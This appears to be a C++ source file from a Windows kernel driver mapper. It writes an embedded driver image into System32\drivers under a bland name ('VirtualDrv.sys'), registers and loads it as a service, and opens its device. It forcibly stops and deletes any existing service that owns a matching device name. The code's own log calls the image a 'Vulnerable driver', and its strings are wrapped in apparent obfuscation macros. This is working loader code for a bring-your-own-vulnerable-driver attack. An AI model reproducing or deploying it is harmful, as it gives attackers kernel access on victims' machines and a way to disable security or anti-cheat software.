#include "VulnerableDriverLoader.h"
#include <algorithm>
#include <string>
#include <vector>

using PENUMOBJECTSCALLBACK = NTSTATUS( NTAPI* )( POBJECT_DIRECTORY_INFORMATION, PVOID );

struct OBJSCANPARAM
{
	const wchar_t* Buffer;
	ULONG BufferSize;
};

static NTSTATUS __stdcall EnumSystemObj( const wchar_t* RootDir, HANDLE hRootDir, PENUMOBJECTSCALLBACK Callback, PVOID CallbackParam )
{
	ULONG ctx = 0, rlen = 0;
	auto hDir = hRootDir;
	auto Status = STATUS_UNSUCCESSFUL;
	auto CallbackStatus = STATUS_UNSUCCESSFUL;
	OBJECT_ATTRIBUTES objAttr{};
	UNICODE_STRING sName{};
	POBJECT_DIRECTORY_INFORMATION ObjInfo{};

	if ( !Callback )
		return STATUS_INVALID_PARAMETER_4;

	__try
	{
		if ( RootDir )
		{
			ZeroMemory( &sName, sizeof sName );
			RtlInitUnicodeString( &sName, RootDir );
			InitializeObjectAttributes( &objAttr, &sName, OBJ_CASE_INSENSITIVE, nullptr, nullptr );

			Status = NtOpenDirectoryObject( &hDir, DIRECTORY_QUERY, &objAttr );

			if ( Status )
				return Status;
		}
		else if ( !hRootDir )
		{
			return STATUS_INVALID_PARAMETER_2;
		}

		do
		{
			Status = NtQueryDirectoryObject( hDir, nullptr, 0, TRUE, FALSE, &ctx, &rlen );

			if ( Status != STATUS_BUFFER_TOO_SMALL )
				break;

			ObjInfo = r_cast<POBJECT_DIRECTORY_INFORMATION>( RtlAllocateHeap( NtCurrentPeb( )->ProcessHeap, HEAP_ZERO_MEMORY, rlen ) );

			if ( !ObjInfo )
				break;

			Status = NtQueryDirectoryObject( hDir, ObjInfo, rlen, TRUE, FALSE, &ctx, &rlen );

			if ( !NT_SUCCESS( Status ) )
			{
				RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, ObjInfo );
				break;
			}

			CallbackStatus = Callback( ObjInfo, CallbackParam );
			RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, ObjInfo );

			if ( NT_SUCCESS( CallbackStatus ) )
			{
				Status = STATUS_SUCCESS;
				break;
			}
		} while ( true );

		if ( hDir )
			NtClose( hDir );
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		Status = STATUS_ACCESS_VIOLATION;
	}

	return Status;
}

static NTSTATUS __stdcall DetectObjCallback( POBJECT_DIRECTORY_INFORMATION Entry, void* CallbackParam )
{
	auto Param = r_cast<OBJSCANPARAM*>( CallbackParam );

	if ( !Entry )
		return STATUS_INVALID_PARAMETER_1;

	if ( !CallbackParam )
		return STATUS_INVALID_PARAMETER_2;

	if ( !Param->Buffer || !Param->BufferSize )
		return STATUS_MEMORY_NOT_ALLOCATED;

	if ( Entry->Name.Buffer )
		if ( wcscmp( Entry->Name.Buffer, Param->Buffer ) == 0 )
			return STATUS_SUCCESS;

	return STATUS_UNSUCCESSFUL;
}

bool IsObjExist( const wchar_t* RootDir, const wchar_t* objName )
{
	if ( !objName )
		return false;

	auto str_l = wcslen( objName );
	OBJSCANPARAM Param{ objName, *reinterpret_cast<ULONG*>( &str_l ) };

	return NT_SUCCESS( EnumSystemObj( RootDir, nullptr, DetectObjCallback, &Param ) );
}

static bool StartsWithI( const std::wstring& value, const wchar_t* prefix )
{
	if ( !prefix )
		return false;

	const auto prefixLength = wcslen( prefix );

	if ( value.length( ) < prefixLength )
		return false;

	return _wcsnicmp( value.c_str( ), prefix, prefixLength ) == 0;
}

static std::wstring TrimDriverImagePath( const wchar_t* imagePath )
{
	if ( !imagePath || !*imagePath )
		return {};

	std::wstring result( imagePath );

	while ( !result.empty( ) && iswspace( result.front( ) ) )
		result.erase( result.begin( ) );

	while ( !result.empty( ) && iswspace( result.back( ) ) )
		result.pop_back( );

	if ( result.length( ) >= 2 && result.front( ) == L'"' )
	{
		const auto quote = result.find( L'"', 1 );

		if ( quote != std::wstring::npos )
			result = result.substr( 1, quote - 1 );
	}

	return result;
}

static std::wstring NormalizeDriverImagePath( const wchar_t* imagePath )
{
	auto path = TrimDriverImagePath( imagePath );

	if ( path.empty( ) )
		return {};

	std::replace( path.begin( ), path.end( ), L'/', L'\\' );

	wchar_t expanded[ MAX_PATH * 2 ]{};

	if ( ExpandEnvironmentStringsW( path.c_str( ), expanded, _countof( expanded ) ) && expanded[ 0 ] )
		path = expanded;

	wchar_t windowsDirectory[ MAX_PATH ]{};
	GetWindowsDirectoryW( windowsDirectory, _countof( windowsDirectory ) );

	if ( StartsWithI( path, L"\\??\\" ) )
		path.erase( 0, 4 );
	else if ( StartsWithI( path, L"\\\\?\\" ) )
		path.erase( 0, 4 );
	else if ( StartsWithI( path, L"\\SystemRoot\\" ) )
		path = std::wstring( windowsDirectory ) + path.substr( wcslen( L"\\SystemRoot" ) );
	else if ( StartsWithI( path, L"System32\\" ) )
		path = std::wstring( windowsDirectory ) + L"\\" + path;
	else if ( StartsWithI( path, L"\\Windows\\" ) && windowsDirectory[ 1 ] == L':' )
		path = std::wstring( windowsDirectory, windowsDirectory + 2 ) + path;

	wchar_t fullPath[ MAX_PATH * 2 ]{};

	if ( GetFullPathNameW( path.c_str( ), _countof( fullPath ), fullPath, nullptr ) )
		path = fullPath;

	return path;
}

static bool QueryServiceImagePath( SC_HANDLE service, std::wstring* imagePath )
{
	if ( !service || !imagePath )
		return false;

	DWORD needed = 0;
	QueryServiceConfigW( service, nullptr, 0, &needed );

	if ( !needed )
		return false;

	std::vector<uint8_t> buffer( needed );
	auto config = r_cast<QUERY_SERVICE_CONFIGW*>( buffer.data( ) );

	if ( !QueryServiceConfigW( service, config, needed, &needed ) || !config->lpBinaryPathName )
		return false;

	*imagePath = config->lpBinaryPathName;
	return !imagePath->empty( );
}

static std::wstring CanonicalServiceName( const wchar_t* value )
{
	if ( !value )
		return {};

	std::wstring result;

	for ( auto ch = value; *ch; ++ch )
	{
		if ( iswalnum( *ch ) )
			result.push_back( towlower( *ch ) );
	}

	return result;
}

static bool NameEqualsI( const wchar_t* left, const wchar_t* right )
{
	if ( !left || !right || !*left || !*right )
		return false;

	return _wcsicmp( left, right ) == 0;
}

static bool CanonicalNameMatches( const wchar_t* serviceValue, const std::vector<std::wstring>& candidates )
{
	const auto serviceCanonical = CanonicalServiceName( serviceValue );

	if ( serviceCanonical.empty( ) )
		return false;

	for ( const auto& candidate : candidates )
	{
		if ( candidate.empty( ) )
			continue;

		const auto candidateCanonical = CanonicalServiceName( candidate.c_str( ) );

		if ( candidateCanonical.empty( ) )
			continue;

		if ( serviceCanonical == candidateCanonical )
			return true;

		if ( candidateCanonical.length( ) >= 4 &&
			serviceCanonical.find( candidateCanonical ) != std::wstring::npos )
			return true;

		if ( serviceCanonical.length( ) >= 4 &&
			candidateCanonical.find( serviceCanonical ) != std::wstring::npos )
			return true;
	}

	return false;
}

static bool ServiceNameMatches( const wchar_t* serviceName, const wchar_t* displayName, const std::vector<std::wstring>& candidates )
{
	for ( const auto& candidate : candidates )
	{
		if ( NameEqualsI( serviceName, candidate.c_str( ) ) || NameEqualsI( displayName, candidate.c_str( ) ) )
			return true;
	}

	return CanonicalNameMatches( serviceName, candidates ) || CanonicalNameMatches( displayName, candidates );
}

static bool FindRunningDriverServiceByDeviceName( const wchar_t* deviceName, std::wstring* serviceName, std::wstring* imagePath )
{
	if ( !deviceName || !*deviceName || !serviceName )
		return false;

	std::vector<std::wstring> candidates;
	candidates.emplace_back( deviceName );

	const auto scm = OpenSCManagerW( nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT );

	if ( !scm )
		return false;

	DWORD bytesNeeded = 0;
	DWORD serviceCount = 0;
	DWORD resumeHandle = 0;

	EnumServicesStatusExW( scm, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_ACTIVE, nullptr, 0, &bytesNeeded, &serviceCount, &resumeHandle, nullptr );

	if ( !bytesNeeded )
	{
		CloseServiceHandle( scm );
		return false;
	}

	std::vector<uint8_t> buffer( bytesNeeded );
	auto services = r_cast<ENUM_SERVICE_STATUS_PROCESSW*>( buffer.data( ) );
	bool result = false;

	if ( EnumServicesStatusExW( scm, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_ACTIVE, buffer.data( ), bytesNeeded, &bytesNeeded, &serviceCount, &resumeHandle, nullptr ) )
	{
		for ( DWORD i = 0; i < serviceCount; ++i )
		{
			const auto service = OpenServiceW( scm, services[ i ].lpServiceName, SERVICE_QUERY_CONFIG );

			if ( !service )
				continue;

			std::wstring currentImagePath;
			const auto hasImagePath = QueryServiceImagePath( service, &currentImagePath );
			CloseServiceHandle( service );

			const auto normalizedImagePath = hasImagePath ? NormalizeDriverImagePath( currentImagePath.c_str( ) ) : std::wstring{};

			LOG_SEC( "[*] - Checking service lpServiceName=%ls, lpDisplayName=%ls, hasImagePath=%d, currentImagePath=%ls",
				services[ i ].lpServiceName ? services[ i ].lpServiceName : L"",
				services[ i ].lpDisplayName ? services[ i ].lpDisplayName : L"",
				hasImagePath ? 1 : 0,
				hasImagePath ? currentImagePath.c_str( ) : L"" );

			if ( !ServiceNameMatches( services[ i ].lpServiceName, services[ i ].lpDisplayName, candidates ) )
				continue;

			*serviceName = services[ i ].lpServiceName;

			if ( imagePath )
				*imagePath = normalizedImagePath;

			result = true;
			break;
		}
	}

	CloseServiceHandle( scm );
	return result;
}

bool StopDriverService( const wchar_t* serviceName, bool bDelete )
{
	if ( !serviceName || !*serviceName )
		return false;

	const auto scm = OpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );

	if ( !scm )
		return false;

	const auto service = OpenServiceW( scm, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE );

	if ( !service )
	{
		CloseServiceHandle( scm );
		return false;
	}

	bool isStopped = true;

	SERVICE_STATUS_PROCESS status{};
	DWORD bytesNeeded = 0;

	if ( QueryServiceStatusEx( service, SC_STATUS_PROCESS_INFO, r_cast<LPBYTE>( &status ), sizeof( status ), &bytesNeeded ) &&
		status.dwCurrentState != SERVICE_STOPPED )
	{
		isStopped = false;
		SERVICE_STATUS stopStatus{};
		ControlService( service, SERVICE_CONTROL_STOP, &stopStatus );

		for ( auto i = 0; i < 30; ++i )
		{
			Sleep( 100 );

			if ( !QueryServiceStatusEx( service, SC_STATUS_PROCESS_INFO, r_cast<LPBYTE>( &status ), sizeof( status ), &bytesNeeded ) )
				break;

			if ( status.dwCurrentState == SERVICE_STOPPED )
			{
				isStopped = true;
				break;
			}
		}
	}

	bool deleted = false;

	if ( bDelete )
	{
		deleted = DeleteService( service ) != FALSE || GetLastError( ) == ERROR_SERVICE_MARKED_FOR_DELETE;
	}

	CloseServiceHandle( service );
	CloseServiceHandle( scm );
	return bDelete ? ( isStopped && deleted ) : isStopped;
}

bool BuildMapperDriverPathW( wchar_t* buffer, size_t count, const wchar_t* driverFileName )
{
	if ( !buffer || !count || !driverFileName )
		return false;

	buffer[ 0 ] = 0;

	if ( !GetSystemDirectoryW( buffer, s_cast<UINT>( count ) ) )
		return false;

	std::wstring path( buffer );
	path += pstrw( L"\\drivers\\" );
	path += driverFileName;

	if ( path.size( ) + 1 > count )
		return false;

	wcscpy_s( buffer, count, path.c_str( ) );
	return true;
}

bool BuildMapperDriverPathA( char* buffer, size_t count, const char* driverFileName )
{
	if ( !buffer || !count || !driverFileName )
		return false;

	buffer[ 0 ] = 0;

	if ( !GetSystemDirectoryA( buffer, s_cast<UINT>( count ) ) )
		return false;

	std::string path( buffer );
	path += pstra( "\\drivers\\" );
	path += driverFileName;

	if ( path.size( ) + 1 > count )
		return false;

	strcpy_s( buffer, count, path.c_str( ) );
	return true;
}

bool BuildMapperDriverPathW( wchar_t* buffer, size_t count )
{
	return BuildMapperDriverPathW( buffer, count, pstrw( L"VirtualDrv.sys" ) );
}

bool BuildMapperDriverPathA( char* buffer, size_t count )
{
	return BuildMapperDriverPathA( buffer, count, pstra( "VirtualDrv.sys" ) );
}

NTSTATUS DropLoadAndOpenMapperDriver( const char* backendName, const wchar_t* devicePath, const void* driverData, size_t driverSize, HANDLE* deviceHandle, uint32_t statusBase, const char* serviceName )
{
	if ( !backendName || !devicePath || !driverData || !driverSize || !deviceHandle )
		return STATUS_INVALID_PARAMETER;

	*deviceHandle = INVALID_HANDLE_VALUE;

	std::string ansiServiceName = serviceName ? std::string( serviceName ) : std::string( pstra( "VirtualDrv" ) );
	std::wstring wDriverFileNameSuffix;

	if ( serviceName )
	{
		wDriverFileNameSuffix = std::wstring( serviceName, serviceName + std::strlen( serviceName ) ) + pstrw( L".sys" );
	}
	else
	{
		wDriverFileNameSuffix = pstrw( L"VirtualDrv.sys" );
	}

	wchar_t wDrvFileName[ MAX_PATH * 2 ]{};

	if ( !BuildMapperDriverPathW( wDrvFileName, _countof( wDrvFileName ), wDriverFileNameSuffix.c_str( ) ) )
	{
		LOG_SEC( "[-] - [%s] Ldr: GetSystemDirectoryW failed", backendName );
		return statusBase;
	}

	const auto written = WriteBufferToFile( wDrvFileName, const_cast<void*>( driverData ), s_cast<int>( driverSize ), FALSE, FALSE );

	if ( written != driverSize )
	{
		LOG_SEC( "[-] - [%s] Ldr: Error writing driver on disk written=0x%X expected=0x%llx", backendName, written, driverSize );
		return statusBase + 1;
	}

	char drvFileName[ MAX_PATH ]{};

	std::string ansiDriverSuffix = ansiServiceName + pstra( ".sys" );

	if ( !BuildMapperDriverPathA( drvFileName, _countof( drvFileName ), ansiDriverSuffix.c_str( ) ) )
	{
		LOG_SEC( "[-] - [%s] Ldr: GetSystemDirectoryA failed", backendName );
		return statusBase + 2;
	}

	std::wstring wDevicePath( devicePath );
	std::wstring wDevicePathOnly = wDevicePath.substr( wDevicePath.find_last_of( L'\\' ) + 1 );

	if ( IsObjExist( pstrw( L"\\Device" ), wDevicePathOnly.c_str( ) ) )
	{
		LOG_SEC( "[!] - [%s] Ldr: Device object \\Device\\%ls already exists, trying to identify owning service", backendName, wDevicePathOnly.c_str( ) );

		std::wstring ownerService;
		std::wstring ownerImagePath;

		if ( FindRunningDriverServiceByDeviceName( wDevicePathOnly.c_str( ), &ownerService, &ownerImagePath ) )
		{
			LOG_SEC( "[!] - [%s] Ldr: Device is likely owned by service %ls image=%ls", backendName, ownerService.c_str( ), ownerImagePath.empty( ) ? L"" : ownerImagePath.c_str( ) );

			if ( !StopDriverService( ownerService.c_str( ), true ) )
			{
				LOG_SEC( "[-] - [%s] Ldr: Failed to stop/delete existing service %ls", backendName, ownerService.c_str( ) );
				return statusBase + 4;
			}

			Sleep( 300 );

			if ( IsObjExist( pstrw( L"\\Device" ), wDevicePathOnly.c_str( ) ) )
			{
				LOG_SEC( "[-] - [%s] Ldr: Device object \\Device\\%ls still exists after unloading %ls", backendName, wDevicePathOnly.c_str( ), ownerService.c_str( ) );
				return statusBase + 5;
			}
		}
		else
		{
			LOG_SEC( "[-] - [%s] Ldr: Device object \\Device\\%ls exists, but no running driver service matching device/backend name was found", backendName, wDevicePathOnly.c_str( ) );
			return statusBase + 6;
		}
	}

	if ( const auto status = LoadAndUnload( ansiServiceName.c_str( ), drvFileName, true, false ) )
	{
		LOG_SEC( "[-] - [%s] Ldr: LoadDriver %s failed [%ls] Status %X", backendName, ansiServiceName.c_str( ), wDevicePathOnly.c_str( ), status );
		return status;
	}

	*deviceHandle = CreateFileW( devicePath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );

	if ( !*deviceHandle || *deviceHandle == INVALID_HANDLE_VALUE )
	{
		LOG_SEC( "[-] - [%s] SCM: Driver device open failure", backendName );
		UnloadMapperDriver( ansiServiceName.c_str( ) );
		return statusBase + 3;
	}

	LOG_SEC( "[!] - [%s] SCM: Vulnerable driver loaded as %s and opened", backendName, ansiServiceName.c_str( ) );
	return STATUS_SUCCESS;
}

void CloseMapperDevice( HANDLE* deviceHandle )
{
	if ( !deviceHandle || !*deviceHandle || *deviceHandle == INVALID_HANDLE_VALUE )
		return;

	CloseHandle( *deviceHandle );
	*deviceHandle = INVALID_HANDLE_VALUE;
}

NTSTATUS UnloadMapperDriver( const char* serviceName )
{
	std::string ansiServiceName = serviceName ? std::string( serviceName ) : std::string( pstra( "VirtualDrv" ) );
	std::string ansiDriverSuffix = ansiServiceName + pstra( ".sys" );

	char drvFileName[ MAX_PATH ]{};

	if ( BuildMapperDriverPathA( drvFileName, _countof( drvFileName ), ansiDriverSuffix.c_str( ) ) )
	{
		return LoadAndUnload( ansiServiceName.c_str( ), drvFileName, false, false );
	}

	return STATUS_UNSUCCESSFUL;
}
